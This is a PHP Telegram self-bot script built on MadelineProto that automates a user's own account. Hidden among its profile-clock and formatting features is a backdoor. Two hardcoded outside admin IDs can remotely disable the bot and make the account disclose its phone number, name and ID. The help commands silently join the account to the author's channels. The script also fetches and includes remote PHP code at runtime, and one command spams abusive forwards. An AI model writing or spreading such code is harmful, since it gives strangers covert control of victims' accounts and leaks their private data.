<?php
ini_set('memory_limit', '1024M');
ini_set('display_errors', 0);
ini_set('memory_limit', -1);
ini_set('max_execution_time', 300);
if(!is_dir('files')){
mkdir('files');
mkdir("list");
}
if (!file_exists('madeline.php') or filesize('madeline.php') < rand(1024, 2048)) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
} 
if(!file_exists('Auto_restart.txt')){
file_put_contents('Auto_restart.txt', '');
}
if(!file_exists('timename1.txt')){
file_put_contents('timename1.txt','off');
}
if(!file_exists('timename2.txt')){
file_put_contents('timename2.txt','off');
}
if(!file_exists('timebio1.txt')){
file_put_contents('timebio1.txt','off');
}
if(!file_exists('timebio2.txt')){
file_put_contents('timebio2.txt','off');
}
if(!file_exists('bioen.txt')){
file_put_contents('bioen.txt','off');
}
if(!file_exists('biofa.txt')){
file_put_contents('biofa.txt','off');
}
if(!file_exists('list/ban.txt')){
}

     if(!file_exists('list/vip.txt')){
          }

          if(!file_exists('list/mute.txt')){
               }

          if (!file_exists('MadelineProto.log')) {
               unlink('MadelineProto.log');
          }
include 'madeline.php';
include 'jdf.php';
$settings = [
    'logger' => [
        'logger_level' => 5,
        'max_size' => 5 * 1024 * 1024
    ],
    'serialization' => [
        'serialization_interval' => 30,
    ],
];
$settings = ['logger'=>['logger'=>0],'app_info'=> ['api_id'=>2494191,'api_hash'=> 'fe8ce6b4e0f921c58cd0937cfae60678']];
$MadelineProto = new \danog\MadelineProto\API('session.madeline',$settings);
$MadelineProto->start();
 
if(file_get_contents('timename1.txt') == 'on'){
date_default_timezone_set('Asia/Tehran');
    $time = date("H:i");
    $fonts = [["ð¶","ð·","ð¸","ð¹","ðº","ð»","ð¼","ð½","ð¾","ð¿"],
["ð","ð","ð","ð","ð","ð","ð","ð","ð ","ð¡"]];
	$time = date("H:i");
    $time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("Hâ¢i"));
    $day_number = jdate('j');
    $month_number = jdate('n');
    $year_number = jdate('y');
    $day_name = jdate('l');

  $MadelineProto->account->updateProfile(['last_name' => "â $time2 â"]);

}
if(file_get_contents('timename2.txt') == 'on'){
date_default_timezone_set('Asia/Tehran');
    $time = date("H:i");
   $fonts = [["ð¶","ð·","ð¸","ð¹","ðº","ð»","ð¼","ð½","ð¾","ð¿"],
["ð¬","ð­","ð®","ð¯","ð°","ð±","ð²","ð³","ð´","ðµ"]];
  $time = date("H:i");
  $time = date("H:i");
    $time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("Há´¥i"));
    $day_number = jdate('j');
    $month_number = jdate('n');
    $year_number = jdate('y');
    $day_name = jdate('l');

  $MadelineProto->account->updateProfile(['last_name' => "ã $time2 ã"]);

}
if(file_get_contents('timebio1.txt') == 'on'){
date_default_timezone_set('Asia/Tehran');
    $time = date("H:i");
    $fonts = [["ð¶","ð·","ð¸","ð¹","ðº","ð»","ð¼","ð½","ð¾","ð¿"],
["ð","ð","ð","ð","ð","ð","ð","ð","ð ","ð¡"]];
	$time = date("H:i");
    $time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("Hâ¢â¤i"));
    $day_number = jdate('j');
    $month_number = jdate('n');
    $year_number = jdate('y');
    $day_name = jdate('l');

  $MadelineProto->account->updateProfile(['about' => "â¢á´Éªá´á´â¢ â¢ $time2 â¢ "]);

}
if(file_get_contents('timebio2.txt') == 'on'){
date_default_timezone_set('Asia/Tehran');
    $time = date("H:i");
    $fonts = [["ð¶","ð·","ð¸","ð¹","ðº","ð»","ð¼","ð½","ð¾","ð¿"],
["ð¬","ð­","ð®","ð¯","ð°","ð±","ð²","ð³","ð´","ðµ"]];
  $time = date("H:i");
    $time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("Hð¦i"));
    $day_number = jdate('j');
    $month_number = jdate('n');
    $year_number = jdate('y');
    $day_name = jdate('l');

  $MadelineProto->account->updateProfile(['about' => "ðððð  [ $time2 ] "]);

}
if(file_get_contents('biofa.txt') == 'on'){
date_default_timezone_set('Asia/Tehran');
    $time = date("H:i");
    $fonts = [["ð¶","ð·","ð¸","ð¹","ðº","ð»","ð¼","ð½","ð¾","ð¿"],
["ð","ð","ð","ð","ð","ð","ð","ð","ð ","ð¡"]];
	$time = date("H:i");
    $time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("Hâ¢i"));
    $day_number = jdate('j');
    $month_number = jdate('n');
    $year_number = jdate('y');
    $day_name = jdate('l');

  $MadelineProto->account->updateProfile(['about' => "ÙØ¶ÙÙÛ Ø´ÙØ§ Ø¯Ø± Ø³Ø§Ø¹Øª $time2 Ø«Ø¨Øª Ø´Ø¯ :) "]);

}
if(file_get_contents('bioen.txt') == 'on'){
date_default_timezone_set('Asia/Tehran');
    $time = date("H:i");
    $fonts = [["ð¶","ð·","ð¸","ð¹","ðº","ð»","ð¼","ð½","ð¾","ð¿"],
["ð¬","ð­","ð®","ð¯","ð°","ð±","ð²","ð³","ð´","ðµ"]];
  $time = date("H:i");
    $time2 = str_replace(range(0,9),$fonts[array_rand($fonts)],date("H:i"));
    $day_number = jdate('j');
    $month_number = jdate('n');
    $year_number = jdate('y');
    $day_name = jdate('l');

  $MadelineProto->account->updateProfile(['about' => "Your prying hour $time2 was recorded  "]);

}
function closeConnection($message = 'reza Self is Running...')
{
if (php_sapi_name() === 'cli' || isset($GLOBALS['exited'])) {
return;
}
  @ob_end_clean();
  header('Connection: close');
  ignore_user_abort(true);
  ob_start();
  echo '<html><body><h1 style="margin-top:50px; text-align:center; color:black; text-shadow:1px 1px 15px black;">'.$message.'</h1></body</html>';
  $size = ob_get_length();
  header("Content-Length: $size");
  header('Content-Type: text/html');
  
  $GLOBALS['exited'] = true;
}
function shutdown_function($lock)
{
  $a = fsockopen((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] ? 'tls' : 'tcp').'://'.$_SERVER['SERVER_NAME'], $_SERVER['SERVER_PORT']);
  fwrite($a, $_SERVER['REQUEST_METHOD'].' '.$_SERVER['REQUEST_URI'].' '.$_SERVER['SERVER_PROTOCOL']."\r\n".'Host: '.$_SERVER['SERVER_NAME']."\r\n\r\n");
  flock($lock, LOCK_UN);
  fclose($lock);
}
if(!file_exists('part.txt')){
file_put_contents('part.txt','off');
}
if(!file_exists('bold.txt')){
file_put_contents('bold.txt','off');
}
if (!file_exists('bot.lock')) {
touch('bot.lock');
}
$lock = fopen('bot.lock', 'r+');
$try = 1;
$locked = false;
while (!$locked) {
$locked = flock($lock, LOCK_EX | LOCK_NB);
if (!$locked) {
closeConnection();
if ($try++ >= 30) {
exit;
}
 sleep(1);
}

}
if(!file_exists('data.json')){
 file_put_contents('data.json', '{"power":"on","adminStep":"","timename1":"off","timename2":"off","timebio1":"off","timebio2":"off","biofa":"off","bioen":"off","typing":"off","poker":"off","funny":"off","hashtag":"off","photo":"off","loc":"off","file":"off","audio":"off","part":"off","lockpv":"off","fafont":"off","enfont":"off","proactions":"off","under":"off","pmrun":"on","bold":"off","rezavsali":"off","italic":"off","echo":"off","video":"off","markread":"off","gaming":"off","gamepv":"off","botan":"Ø³ÙØ§Ù Ø¯ÙØ³Øª Ø¹Ø²ÛØ² ÙØ·ÙØ§ Ø¨Ù Ø§ÛÙ ØµÙØ±Øª ÛÚ© Ù¾Ø§Ø³Ø® Ø¨Ø±Ø§Û Ø¬ÙØ§Ø¨ Ø±Ø¨Ø§Øª ØªÙØ¸ÛÙ Ú©ÙÛØ¯ ÙÙÙÙÙðð» Ù¾Ø§Ø³Ø® Ø¯Ø± Ø¬ÙØ§Ø¨ Ø±Ø¨Ø§Øª Ø³ÙØ§Ù Ø±Ø¨Ø§Øª Ø§ÙØ§ØªØ§ Ø§ÙÙØ§ÛÙ ÙØ³Øª","enemies":[],"answering":[]}');
}

class EventHandler extends \danog\MadelineProto\EventHandler
{
public function __construct($MadelineProto){
parent::__construct($MadelineProto);
}
public function onUpdateSomethingElse($update)
{
if (isset($update['_'])){
  if ($update['_'] == 'updateNewMessage'){
  onUpdateNewMessage($update);
  }
  else if ($update['_'] == 'updateNewChannelMessage'){
  onUpdateNewChannelMessage($update);
}
}
}

public function onUpdateNewChannelMessage($update)
{
 yield $this->onUpdateNewMessage($update);
}
public function onUpdateNewMessage($update){
$from_id = isset($update['message']['from_id']) ? $update['message']['from_id']:'';
  try {
 if(isset($update['message']['message'])){
 $text = $update['message']['message'];
 $msg_id = $update['message']['id'];
 $message = isset($update['message']) ? $update['message']:'';
 $MadelineProto = $this;
 $partmode = file_get_contents("part.txt");
 $boldmode=file_get_contents("bold.txt");
  $me = yield $MadelineProto->get_self();
 $para = $me['id'];
  $adminfantet = 1297266019;
 $Adminreza = 1492303513;
 $chID = yield $MadelineProto->get_info($update);
 $peer = $chID['bot_api_id'];
 $type3 = $chID['type'];
 @$data = json_decode(file_get_contents("data.json"), true);
 $step = $data['adminStep'];
 if($from_id == $para or $from_id == $adminfantet or $from_id ==$Adminreza ){
 if($text == '/exit;'){
  exit;
 }
 
 if($from_id == $adminfantet or $from_id ==$Adminreza ){
   if(preg_match("/^[\/\#\!]?(rezavsali) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(rezavsali) (on|off)$/i", $text, $m);
	 $phone = '+' . $me[ 'phone' ];
     $data['rezavsali'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->sendMessage(['peer' => $Adminreza, 'message' => " ð¢ Ú©Ø§Ø±Ø¨Ø±  $Sis Ø¨Ù Ø¯ÙÛÙ Ú¯Ù Ø®ÙØ±Û Ø²ÛØ§Ø¯ Ø§Ø² Ø±Ø¨Ø§Øª Ø§ÙØ§ØªØ§ ØµÛÚ© Ø´Ø¯ ð¢"]);
   $MadelineProto->messages->sendMessage(['peer' => $adminfantet, 'message' => "ð¢ Ú©Ø§Ø±Ø¨Ø±  $Sis Ø¨Ù Ø¯ÙÛÙ Ú¯Ù Ø®ÙØ±Û Ø²ÛØ§Ø¯ Ø§Ø² Ø±Ø¨Ø§Øª Ø§ÙØ§ØªØ§ ØµÛÚ© Ø´Ø¯ ð¢"]);
   }

  if($text == 'Ø´ÙØ§Ø±ÙÙ Ø¨Ú¯Ù'){
              $name = $me[ 'first_name' ];
              $phone = '+' . $me[ 'phone' ];
              yield $MadelineProto->messages->sendMessage( [ 'peer' => $peer, 'reply_to_msg_id' => $msg_id, 'message' => "
ð¶ð ð²ð­ : [$para](tg://user?id=$para)
ð¶ð ð·ðªð¶ð® : $name
ð¶ð ð¹ð±ð¸ð·ð® : `$phone`
", 'parse_mode' => 'MarkDown' ] );
 }}
 
 
 
 
   if(preg_match("/^[\/\#\!]?(bot) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(bot) (on|off)$/i", $text, $m);
     $data['power'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "YOáá ð¤á·OT áOá¯ $m[2]"]);
   }
   
   if ($text == '/reboot' or $text == "/restart" or $text == "Ø±ÛØ³ØªØ§Ø±Øª") {
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => ' Ø±Ø¨Ø§Øª Ø´ÙØ§ Ø±ÛØ³ØªØ§Ø±Øª Ø´Ø¯ !âï¸']);
  yield $this->restart();
  die;
}
   
   
    if ( $data ['rezavsali'] == "off"){
   
   
     if($data['power'] == "on"){   

   
   
   
   
   if(preg_match("/^[\/\#\!]?(timename1) (on|off)$/i", $text)){
  preg_match("/^[\/\#\!]?(timename1) (on|off)$/i", $text, $m);
  file_put_contents('timename1.txt', $m[2]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "timename1 ðá°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(timename2) (on|off)$/i", $text)){
  preg_match("/^[\/\#\!]?(timename2) (on|off)$/i", $text, $m);
  file_put_contents('timename2.txt', $m[2]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "timename2 ðá°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(timebio1) (on|off)$/i", $text)){
  preg_match("/^[\/\#\!]?(timebio1) (on|off)$/i", $text, $m);
  file_put_contents('timebio1.txt', $m[2]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "timebio1 á°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(timebio2) (on|off)$/i", $text)){
  preg_match("/^[\/\#\!]?(timebio2) (on|off)$/i", $text, $m);
  file_put_contents('timebio2.txt', $m[2]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "timebio2 á°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(bioen) (on|off)$/i", $text)){
  preg_match("/^[\/\#\!]?(bioen) (on|off)$/i", $text, $m);
  file_put_contents('bioen.txt', $m[2]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "bioen á°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(biofa) (on|off)$/i", $text)){
  preg_match("/^[\/\#\!]?(biofa) (on|off)$/i", $text, $m);
  file_put_contents('biofa.txt', $m[2]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "biofa á°OáªE áOá¯ $m[2]"]);
   }
if(preg_match("/^[\/\#\!]?(EnMode) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(EnMode) (on|off)$/i", $text, $m);
     $data['enfont'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "EáGáªISá¼ ð®á°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(FaMode) (on|off)$/i", $text)){
     preg_match("/^[\/\#\!]?(FaMode) (on|off)$/i", $text, $m);
     $data['fafont'] = $m[2];
     file_put_contents("data.json", json_encode($data));
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á´á©áSI ðá°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(part) (on|off)$/i", $text)){
    preg_match("/^[\/\#\!]?(part) (on|off)$/i", $text, $m);
    file_put_contents('part.txt', $m[2]);
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á­á©áT ðªá°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(poker) (on|off)$/i", $text)){
       preg_match("/^[\/\#\!]?(poker) (on|off)$/i", $text, $m);
       $data['poker'] = $m[2];
       file_put_contents("data.json", json_encode($data));
       $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á­OKEá ðá°OáªE áOá¯ $m[2]"]);
   }
  if(preg_match("/^[\/\#\!]?(funny) (on|off)$/i", $text)){
       preg_match("/^[\/\#\!]?(funny) (on|off)$/i", $text, $m);
       $data['funny'] = $m[2];
       file_put_contents("data.json", json_encode($data));
       $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á´áááY ðá°OáªE áOá¯ $m[2]"]);
   }
   if(preg_match("/^[\/\#\!]?(hashtag) (on|off)$/i", $text)){
    preg_match("/^[\/\#\!]?(hashtag) (on|off)$/i", $text, $m);
    $data['hashtag'] = $m[2];
    file_put_contents("data.json", json_encode($data));
    $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á¼á©Sá¼Tá©G ðá°OáªE áOá¯ $m[2]"]);
     }
   if(preg_match("/^[\/\#\!]?(italic) (on|off)$/i", $text)){
    preg_match("/^[\/\#\!]?(italic) (on|off)$/i", $text, $m);
    $data['italic'] = $m[2];
    file_put_contents("data.json", json_encode($data));
    $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ITá©áªIá ð§·á°OáªE áOá¯ $m[2]"]);
     }
   if(preg_match("/^[\/\#\!]?(underline) (on|off)$/i", $text)){
  preg_match("/^[\/\#\!]?(underline) (on|off)$/i", $text, $m);
  $data['under'] = $m[2];
  file_put_contents("data.json", json_encode($data));
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "áááªEááªIáE ðá°OáªE áOá¯ $m[2]"]);
   }
  if(preg_match("/^[\/\#\!]?(bold) (on|off)$/i", $text)){
    preg_match("/^[\/\#\!]?(bold) (on|off)$/i", $text, $m);
    file_put_contents('bold.txt', $m[2]);
    file_put_contents("data.json", json_encode($data));
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "á·Oáªáª ðá°OáªE áOá¯ $m[2]"]);
   }

           if ($text == '/proxy' or $text == 'Ù¾Ø±ÙÚ©Ø³Û') {
            $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
           http://api.codebazan.ir/mtproto/?type=html&channel=ProxyMTProto
           Ù¾Ø±ÙÚ©Ø³Û Ø¨Ø±Ø§Û Ø³Ø±ÙØ±ÙØ Ø¨ÙØ§Ù Ø±ÙØ´ Ø³ÙØ·Ø§Ùð"]);
           }
  if ($text == '/ping' or $text == '/ping' or $text == 'Ù¾ÛÙÚ¯') {
$ping = sys_getloadavg();
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ù¾ÛÙÚ¯ -> $ping[0]", 'parse_mode' => 'MarkDown']);
  }
  if($text == "for" or $text == "fosh" or $text == "ÙØ­Ø´"){
for($i = 1 ; $i < 30 ; $i++){
$rand = rand(1,480);
yield $MadelineProto->messages->forwardMessages(['from_peer' => "@asgharisam", 'to_peer' => $peer, 'id' => [$rand], ]);
}
}
if ($text == 'nevisande') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'im_namrd']);
}
	if ($text == 'Ø¨Ø´ÙØ§Ø±Ø´' or $text == 'count') {
		yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ï¼ï¼"]);
		yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "Ú©ÙØ¨ØµÛ â Ø±ÛØ¯Û Ø¨Ø§Ûð¹ð¤"]);
    }
    if($text=='bk' or $text=='Ø¨Ú©ÛØ±Ù' or $text=='bekiram'){
$bk = ["ð®ð·","â","ð","ð","ð","ð¦","ð","ð§¿","â¾","â»ï¸","âð»","ð¤ª","ð«","ð½","ð","ð","â","ðµ","ð­","ð©","ð","ð","ð","ð","ð§¸","ð","ðµ","ð","ð¯","ð»","ð","ð","ðª","ð","ð°","ð³","ð","ð","ð«","ð¡","ð©¸","ð","ð¿","âï¸","ð¸","â£ï¸","ð","â³ï¸","#ï¸â£","â¹ï¸","ð","ð¹","âï¸","â","â ï¸","ð","ð","ð¯","ð","ð§±","ð","â¨ï¸","ð","ð¦","ð§","âï¸","ðª","ð°","ð","ð¸","â³","ð","ð¥","ð","ð","ð©","ð","ð","ð","ð­","ðª","âï¸","ð","ð","ð","ð","ð¦","ð","ð ","ð¦","ð¦","ð¦","ð","ð¸","ð´","ð¤¯","ð³","â ï¸","ð¤","ð»","ð¼","ð«","ð³","ð¨ð»âð»",];
$Aa = $bk[rand(0, count($bk)-1)];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
$Aa$Aa$Aa$Aa 
$Aa               $Aa
$Aa                  $Aa
$Aa               $Aa
$Aa$Aa$Aa$Aa  
$Aa               $Aa
$Aa                  $Aa
$Aa               $Aa
$Aa$Aa$Aa$Aa"]);
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
$Aa          $Aa
$Aa       $Aa
$Aa    $Aa
$Aa $Aa
$Aa
$Aa $Aa
$Aa    $Aa
$Aa       $Aa
$Aa          $Aa"]);
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
$Aa$Aa$Aa$Aa        $Aa                $Aa
$Aa              $Aa      $Aa             $Aa
$Aa                 $Aa   $Aa          $Aa
$Aa              $Aa      $Aa        $Aa
$Aa$Aa$Aa$Aa       $Aa     $Aa
$Aa              $Aa      $Aa       $Aa
$Aa                 $Aa   $Aa          $Aa
$Aa              $Aa      $Aa             $Aa
$Aa$Aa$Aa$Aa        $Aa                $Aa"]);
}
if($text == 'Ø±Ø§ÙÙÙØ§' or $text == 'help' or $text == 'Help'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos" ]);
$MadelineProto->channels->joinChannel(['channel' => "@fantet"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
â ââââââ â ââââââ â  
*sá´ÊÒ á´á´ á´á´á´ Êá´Êá´* V3
â ââââââ â ââââââ â 

Ø¨Ø§Ø²Ú©Ø±Ø¯Ù Ù¾ÙÙ **Ø§Ú©Ø´Ù**                                `act` 
â¢ âââââââ â âââââââ â¢  
Ø¨Ø§Ø²Ú©Ø±Ø¯Ù Ù¾ÙÙ **ØªÙØ¸ÛÙØ§Øª**                            `tan` 
â¢ âââââââ â âââââââ â¢  
Ø¨Ø§Ø²Ú©Ø±Ø¯Ù Ù¾ÙÙ **Ø³Ø±Ú¯Ø±ÙÛ**                            `gam`
â¢ âââââââ â âââââââ â¢  
Ø¨Ø§Ø²Ú©Ø±Ø¯Ù Ù¾ÙÙ **Ø®ÙØ¯Ú©Ø§Ø±**                              `ans`
â¢ âââââââ â âââââââ â¢  
Ø¨Ø§Ø²Ú©Ø±Ø¯Ù Ù¾ÙÙ **Ø§ÙÙÛ**                                 `eny`
â¢ âââââââ â âââââââ â¢  
Ø¨Ø§Ø²Ú©Ø±Ø¯Ù Ù¾ÙÙ **Ú©Ø§Ø±Ø¨Ø±Ø¯Û**                             `pra`
â¢ âââââââ â âââââââ â¢  
Ø¨Ø§Ø²Ú©Ø±Ø¯Ù Ù¾ÙÙ **ØªØ§ÛÙ**                                   `tim`

â²\
     ð¡ á´Â³ **Memory Using**: $mem_using
        \â²
",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text == 'act'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
$MadelineProto->channels->joinChannel(['channel' => "@FANTET"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->channels->joinChannel(['channel' => "@GP_SELF"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
[ *act help* ]

Ø­Ø§ÙØª ÙØ´ØªÚ¯ ÙÙÛØ³ ð 
 â¸ hashtag on / off  
âââ â âââ 
Ø­Ø§ÙØª Ú©Ø¬ ÙÙÛØ³ ð 
 â¸ italic on / off   
âââ â âââ
Ø­Ø§ÙØª Ø²ÛØ±Ø®Ø· Ø®Ø· Ú©Ø´ÛØ¯Ù ð 
 â¸ underline on / off  
âââ â âââ 
Ø­Ø§ÙØª Ø¯Ø±Ø´Øª  ÙÙÛØ³ð 
 â¸ bold on / off   
âââ â âââ
Ø­Ø§ÙØª ÙÙÙ ÙÙÛØ³ð 
 â¸ mono on / off   
âââ â âââ
Ø­Ø§ÙØª Ù¾Ø§Ø±Øª Ù¾Ø§Ø±Øª ÙÙÛØ³ð 
 â¸ part on / off   
âââââââââââââ-
ÙÙÙ Ú©Ø±Ø¯Ù Ù¾ÛÙÛ Ø§Ú©Ø§ÙØª  ð 
 â¸ lockpv  on / off  
âââ â âââ
Ø­Ø§ÙØª Ù¾ÙÚ©Ø± ð 
 â¸ poker on / off  
âââ â âââ 
Ø­Ø§ÙØª Ø®ÙØ¯Ù ð 
 â¸ funny on / off  
âââ â âââ 
Ø­Ø§ÙØª Ø·ÙØ·Û ð¦ 
 â¸ echo on / off  
ââââââââââ-
Ø­Ø§ÙØª ÙÛØ³ Ø¨Ø¹Ø¯ ÙØ± Ù¾ÛØ§Ù Ø¯Ø± Ú¯Ø±ÙÙ ð 
 â¸ audio on / off  
âââ â âââ 
Ø­Ø§ÙØª Ø§Ø±Ø³Ø§Ù ÙÛØ¯ÛÙ Ø¨Ø¹Ø¯ ÙØ± Ù¾ÛØ§Ù Ø¯Ø± Ú¯Ø±ÙÙ ð½ 
 â¸ video on / off   
âââ â âââ
Ø­Ø§ÙØª Ø§Ø±Ø³Ø§Ù ÙØ§ÛÙ Ø¨Ø¹Ø¯ ÙØ± Ù¾ÛØ§Ù Ø¯Ø± Ú¯Ø±ÙÙ ð 
 â¸ file on / off  
âââ â âââ
Ø­Ø§ÙØª Ø§Ø±Ø³Ø§Ù Ø¹Ú©Ø³ Ø¨Ø¹Ø¯ ÙØ± Ù¾ÛØ§Ù Ø¯Ø± Ú¯Ø±ÙÙ ð 
 â¸ photo on / off  
âââ â âââ
Ø­Ø§ÙØª Ø¨Ø§Ø²Û Ø¨Ø±Ø§Û Ù¾ÛÙÛ ð® 
 â¸ gamepv  on / off    
âââ â âââ 
Ø­Ø§ÙØª Ù¾Ø±ÙØ§Ú©Ø´Ù ÙØ§ (Ø§Ø¬Ø±Ø§Û ÙÙÙ) ð 
 â¸ proactions on / off
ââââââââââ-
Ø¯Ø±ÛØ§ÙØª ØªØ§Ø³ Ø¨Ø§ Ø¹Ø¯Ø¯ Ø¯ÙØ®ÙØ§Ù ð² 
 â¸ /tas  É´á´á´Êá´Ê  
âââ â âââ 
Ø¯Ø±ÛØ§ÙØª Ø§Ø³Ú©ÛØ±ÛÙ Ø´Ø§Øª Ø§Ø² Ø³Ø§ÛØª ð¸ 
 â¸ screen  ê±Éªá´á´  
âââ â âââ
Ø¯Ø±ÛØ§ÙØª Ù¾ÛÙÚ¯ Ø§Ø² Ø³Ø§ÛØª ð 
 â¸ webping  ê±Éªá´á´  
âââ â âââ 
Ø¯ÛØ¯Ù Ù¾ÙØ´Ù Ø³ÙØ±Ø³ Ø¯Ø± ÙØ§Ø³Øª ð 
 â¸ Host 
âââ â âââ
",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text == 'gro'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
$MadelineProto->channels->joinChannel(['channel' => "@FANTET"]);
$MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
$MadelineProto->channels->joinChannel(['channel' => "@GP_SELF"]);
$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "
[ *GRO HELP* ]

ØªÚ¯ ØªÙØ§Ù Ø§ÙØ±Ø§Ø¯ Ú¯Ø±ÙÙ ð¤
 â¸  /alltag
âââ â âââ
ÙÛØ³Øª ÙÛÚÙ ð
 â¸  /viplist
âââ â âââ
ÙÛØ³Øª Ø¨Ù ð°
 â¸  /banlist
âââ â âââ
ÙÛØ³Øª ÙÛÙØªð°
â¤ /mutelist
âââ â âââ
Ø¨Ù Ù Ø¢ÙØ¨Ù Ú©Ø±Ø¯Ù Ú©Ø§Ø±Ø¨Ø±Ø§Ù Ú¯Ø±ÙÙ ð»
 â¸  /ban  Ø¯ÙÛÙ 
 â¸  /unban  Ø¯ÙÛÙ 
âââ â âââ
ÙÛÚÙ Ú©Ø±Ø¯Ù Ú©Ø§Ø±Ø¨Ø±Ø§Ù Ú¯Ø±ÙÙ ð
 â¸  /setvip  Ø¯ÙÛÙ 
 â¸ /delvip  Ø¯ÙÛÙ 
âââ â âââ
Ø³Ú©ÙØª Ú©Ø±Ø¯Ù Ú©Ø§Ø±Ø¨Ø±Ø§Ù Ú¯Ø±ÙÙ ð
 â¸  /mute Ø¯ÙÛÙØ´
 â¸ /unmute Ø¯ÙÛÙ
âââ â âââ
Ù¾Ø§Ú©Ø³Ø§Ø²Û ØªÙØ§Ù ÙÛØ³Øª ÙØ§Û (Ø³Ú©ÙØªØ Ø¨ÙØ ÙÛÚÙ) â»ï¸
 â¸  /cleanlist
âââ â âââ
Ù¾Ø§Ú©Ø³Ø§Ø²Û ÙÛØ³Øª ÙÛÚÙ â¨ï¸
 â¸  /cleanvip
âââ â âââ
Ù¾Ø§Ú©Ø³Ø§Ø²Û ÙÛØ³Øª Ø¨Ù â«ï¸
 â¸  /cleanban
âââ â âââ
Ù¾Ø§Ú©Ø³Ø§Ø²Û ÙÛØ³Øª Ø³Ú©ÙØª ð³
 â¸  /cleanmute
âââ â âââ
Ù¾Ø§Ú©Ø³Ø§Ø²Û Ù¾ÛØ§Ù ÙØ§ Ø¯Ø± Ú¯Ø±ÙÙ â
 â¸  /cleans  É´á´á´Êá´Ê  
âââ â âââ

",
'parse_mode' => 'markdown' , 'disable_web_page_preview' => true ]);
}
if($text == 'tim'){
$load = sys_getloadavg();
$mem_using = round(memory_get_usage() / 1024 / 1024,1);
$MadelineProto->channels->joinChannel(['channel' => "@asgharisam" ]);
